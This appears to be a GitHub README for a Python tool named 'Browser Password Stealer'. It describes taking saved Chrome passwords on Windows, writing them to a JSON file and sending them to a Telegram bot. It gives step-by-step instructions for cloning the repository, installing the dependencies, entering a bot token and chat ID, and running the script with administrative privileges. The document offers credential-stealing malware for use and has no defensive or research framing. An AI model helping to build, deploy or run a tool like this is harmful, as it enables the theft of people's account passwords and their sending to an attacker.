
# Browser Password Stealer

This script retrieves passwords from the Chrome browser and sends them to a Telegram bot.

## Prerequisites

- Python 3.x
- pip (Python package installer)
- Google Chrome installed
- Windows operating system

## Installation

1. **Clone the Repository**

   Open your terminal or command prompt and run the following command to clone the repository:

   ```bash
   git clone https://github.com/yourusername/Browser-Password-Stealer.git
   ```

   Replace `yourusername` with your actual GitHub username.

2. **Navigate to the Repository Directory**

   ```bash
   cd Browser-Password-Stealer
   ```

3. **Install Required Packages**

   Run the following command to install all the required packages:

   ```bash
   pip install -r requirements.txt
   ```

   Create a `requirements.txt` file in your repository with the following content:

   ```txt
   pywin32
   pycryptodome
   requests
   keyring
   ```

## Usage

1. **Update Telegram Bot Credentials**

   Open the `Browser Password Stealer.py` file and update the `BOT_TOKEN` and `CHAT_ID` with your actual Telegram bot token and chat ID.

2. **Run the Script**

   Run the script using Python:

   ```bash
   python "Browser Password Stealer.py"
   ```

   The script will retrieve passwords from the Chrome browser, save them to a JSON file, and send them to the specified Telegram chat.

## Notes

- Ensure that Google Chrome is closed before running the script to avoid conflicts.
- The script requires administrative privileges to access the Chrome user data directory.
